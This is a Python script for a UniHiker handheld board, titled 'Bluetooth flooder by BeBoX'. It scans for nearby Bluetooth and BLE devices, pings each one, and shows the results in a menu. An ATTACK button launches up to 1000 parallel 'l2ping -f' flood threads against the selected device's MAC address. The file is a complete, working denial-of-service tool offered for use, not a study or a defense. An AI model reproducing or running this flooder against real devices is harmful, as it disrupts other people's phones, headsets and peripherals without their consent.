# Import necessary libraries
from unihiker import GUI   
from pinpong.board import *
from pinpong.extension.unihiker import *
import asyncio
import subprocess
import re
import threading
from bleak import BleakScanner
import time
# Initialize variables
bt = {} # dictionary to store Bluetooth devices found during scanning
ligne=[16] # array to store line numbers for display
page = 0 # initialize page number to 0
menu = 0 # initialize menu to 0 (scan not launched at startup)
num_processes = 100 # number of pings to send
onlyname = -1 
gui=GUI() # initialize GUI
texte = gui.draw_text(text="",x=120,y=100,origin="bottom")
tfind = gui.draw_text(text="0",x=240-12,y=0,font_size=12, color="#000000")
tsele = gui.draw_text(text="Bluetooth flooder by BeBoX",x=0,y=2,font_size=10, color="#000000")
ligne = [gui.draw_text(text="", x=16, y=16 + (n * 16), font_size=12, color="#000000") for n in range(12)]

# Set up event loop for asynchronous programming    
loop = asyncio.get_event_loop()

selected = -1 #nothing selected because of empty bt dict at launch

# Define function for sending ping requests
def l2ping_flood(mac):
    p = subprocess.Popen(["l2ping", "-c", "1", "-f", mac])
    p.communicate()
    return p.returncode

# Define function for sending l2ping requests and checking if device responds
def l2ping(address):
    result = os.system(f"sudo l2ping -c 1 {address} > /dev/null 2>&1")
    return result == 0

# Define asynchronous function for scanning Bluetooth devices using BLE protocol
async def scan_ble_devices():
    global bt
    global onlyname
    truc = texte.config(text="Scanning ...")
    time.sleep(0.5)
    
    # Discover BLE devices
    devices = await BleakScanner.discover()
    for device in devices:
        # Check if device responds to ping
        ping_result = l2ping(device.address) 
        # Add device to dictionary with name, address, and ping status
        bt[device.name] = {"address": device.address, "ping": ping_result} 
    truc = texte.config(text="")
    # if the onlyname option is active we take only the devices that have returned a name
    if onlyname > 0:
        filtered_keys = [key for key in bt.keys() if key.count('-') != 5]
        bt= {k: v for k, v in bt.items() if k in filtered_keys}
    return bt
# Define asynchronous function for scanning Bluetooth devices using classic Bluetooth protocol
async def scan_bt_devices():
    global bt
    global onlyname
    truc = texte.config(text="Scanning ...")
    time.sleep(0.5)
    # Execute hcitool scan command and get output
    output = subprocess.check_output("hcitool scan", shell=True)
    # Use regular expression to extract addresses and names of Bluetooth devices
    devices = re.findall(r"((?:[0-9A-F]{2}:){5}[0-9A-F]{2})\s+(.+)", output.decode())
    # Create empty dictionary to store
    # For each device, store its name, address, and ping value in the dictionary
    for device in devices:
        # Call the l2ping function to check if the device is responding
        ping_result = l2ping(device[0])  
        # Add an entry for the device with its name, address and whether it responded or not.
        bt[device[1]] = {"address": device[0], "ping": ping_result}  
    truc = texte.config(text="")
    # if the onlyname option is active we take only the devices that have returned a name
    if onlyname > 0:
        filtered_keys = [key for key in bt.keys() if key.count('-') != 5]
        bt={k: v for k, v in bt.items() if k in filtered_keys}
    print(bt)
    return bt

def drawlines(page):
    global ligne
    global bt
    for n in range(len(ligne)):
        ligne[n].config(text="")
    for n in range(len(ligne)):
        if n < len(bt):
            if n+(page*12)<len(bt):
                key = list(bt.keys())[n+(page*12)]
                # Get ping status for this device
                ping_result = bt[key]['ping']  
                ping_text = "O" if ping_result else "X"  # Determine if the device has responded to a ping or not
                label_text = f"{ping_text} : {key}"
            else:
                label_text = ""
            ligne[n].config(text=label_text)

def m1():
    global menu
    menu=1
    
def m4():
    global menu
    menu=4
    
def m6():
    global menu
    menu=6

def m2():
    global menu
    menu=2

def m5():
    global menu
    menu=5

def m3():
    global menu
    menu=3

def m7():
    global menu
    menu=7
    
def m8():
    global menu
    menu=8
    
bup=gui.add_button(text="UP",x=0,y=220,w=75,h=30,onclick=m1)
bdown=gui.add_button(text="DOWN",x=165,y=220,w=75,h=30,onclick=m4)
bping=gui.add_button(text=str(num_processes),x=82,y=220,w=75,h=30,onclick=m6)
bscan=gui.add_button(text="BT/BLE",x=0,y=255,w=75,h=30,onclick=m2)
bscan2=gui.add_button(text="BT",x=165,y=255,w=75,h=30,onclick=m5)
bname=gui.add_button(text="ALL",x=82,y=255,w=75,h=30,onclick=m8)
battack=gui.add_button(text="ATTACK",x=0,y=290,w=115,h=30,onclick=m3)
bping2=gui.add_button(text="RESET",x=125,y=290,w=115,h=30,onclick=m7)
gui.on_a_click(m1)
gui.on_b_click(m4)

while True:
    time.sleep(0.1)
    if menu==8:
        menu=0
        onlyname = -onlyname
        if onlyname >0:
            bname.config(text="NAMES")
        else:
            bname.config(text="ALL")
        
    if menu==6:
        menu=0
        num_processes+=100
        if num_processes>1000:
            num_processes=100
        bping.config(text=str(num_processes))

    if menu==7:
        menu=0
        bt={}
        page=0
        selected=-1
        drawlines(page)
        truc = tfind.config(x=240-(len(str(len(bt)))*12))
        truc = tfind.config(text=str(len(bt)))        

    if menu==1:
        if selected>0:
            ligne[selected-(page*12)].config(color="#000000")
            selected-=1
            if selected-(page*12)<0:
                page=int(selected/12)
                if page<0:
                    page=0
                drawlines(page)
            ligne[selected-(page*12)].config(color="#00FF00")
        menu=0
    if menu==4:
        if selected<len(bt):
            ligne[selected-(page*12)].config(color="#000000")
            selected+=1
            if selected==len(bt):
                selected-=1
            if selected > (page*12)+11:
                page=page+1
                drawlines(page)
            ligne[selected-(page*12)].config(color="#00FF00")
        menu=0
    if menu==2:
        menu=0
        for n in range(12):
            ligne[n].config(text="")
            ligne[n].config(color="#000000")
        truc = texte.config(text="Scanning ...")
        sbt = loop.run_until_complete(scan_ble_devices())
        truc = texte.config(text="Scanning done")
        time.sleep(1)
        truc = tfind.config(x=240-(len(str(len(bt)))*12))
        truc = tfind.config(text=str(len(bt)))
        truc = texte.config(text=str(len(bt))+" device(s) found")
        time.sleep(2)
        truc = texte.config(text="")
        page=0
        drawlines(page)
        selected = 0
        ligne[selected].config(color="#00FF00")
        
    if menu==5:
        menu=0
        for n in range(12):
            ligne[n].config(text="")
            ligne[n].config(color="#000000")
        truc = texte.config(text="Scanning ...")
        sbt = loop.run_until_complete(scan_bt_devices())
        truc = texte.config(text="Scanning done")
        time.sleep(1)
        truc = tfind.config(x=240-(len(str(len(bt)))*12))
        truc = tfind.config(text=str(len(bt)))
        truc = texte.config(text=str(len(bt))+" device(s) found")
        time.sleep(2)
        truc = texte.config(text="")
        page=0
        drawlines(page)
        selected = 0
        ligne[selected].config(color="#00FF00")
        
    if menu==3:
        print("ATTACK")
        if selected == -1:
            truc = texte.config(text="No target selected !")
            time.sleep(2)
            if len(bt)==0:
                truc = texte.config(text="Try to scan for devices")
                time.sleep(2)
            truc = texte.config(text="")
        else:
            ligne[selected-(page*12)].config(color="#FF0000")
            name = list(bt.keys())[selected]
            print(name)
            mac = bt[name]['address']  # Obtenir l'adresse MAC correspondante
            print(mac)
            ping_result = bt[name]['ping']  # Obtenir le statut ping pour cet appareil
            print(ping_result)
            if ping_result == True:
                tsele.config(text= "Flood attack in progress ...")
                tsele.config(color="#FF0000")
                threads = []
                for i in range(num_processes):
                    t = threading.Thread(target=l2ping_flood, args=(mac,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
                tsele.config(color="#000000")
                tsele.config(text= "Bluetooth flooder by BeBoX")
                ligne[selected-(page*12)].config(color="#00FF00")
            else:
                tsele.config(text= "Device no respond to ping ...")
                tsele.config(color="#FF0000")
                time.sleep(5)
                tsele.config(color="#000000")
                tsele.config(text= "Bluetooth flooder by BeBoX")
                ligne[selected-(page*12)].config(color="#00FF00")
                
        menu=0



